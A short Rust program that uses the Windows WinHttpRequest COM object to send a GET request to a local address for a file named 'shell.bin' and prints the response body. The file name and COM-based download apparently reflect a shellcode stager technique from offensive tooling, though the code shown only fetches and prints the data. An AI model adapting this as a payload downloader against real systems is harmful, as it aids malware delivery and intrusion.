use windows::{
    core::{BSTR, GUID, VARIANT},
    Win32::{
        Networking::WinHttp::IWinHttpRequest,
        System::Com::{
            CoCreateInstance, CoInitializeEx, CoUninitialize,
            CLSCTX_ALL, COINIT_MULTITHREADED,
        },
    },
};

/// CLSID for the `WinHttp.WinHttpRequest.5.1` COM class.
pub const CLSID_WIN_HTTP_REQUEST: GUID = GUID::from_u128(0x2087c2f4_2cef_4953_a8ab_66779b670495);

fn main() -> windows::core::Result<()> {
    unsafe {
        // Initialize the COM subsystem for multithreaded usage
        CoInitializeEx(None, COINIT_MULTITHREADED).ok()?;

        // Create the WinHttpRequest COM object
        let http: IWinHttpRequest = CoCreateInstance(&CLSID_WIN_HTTP_REQUEST, None, CLSCTX_ALL)?;

        // Open a synchronous GET request
        let variant = VARIANT::from(false);
        http.Open(
            &BSTR::from("GET"),
            &BSTR::from("http://127.0.0.1:8080/shell.bin"),
            &variant,
        )?;

        // Send the HTTP request
        http.Send(None)?;

        // Retrieve and print the response body
        let response = http.ResponseBody()?;
        println!("{:?}", response.to_string());
    }

    // Cleanup COM environment
    unsafe { CoUninitialize() };

    Ok(())
}
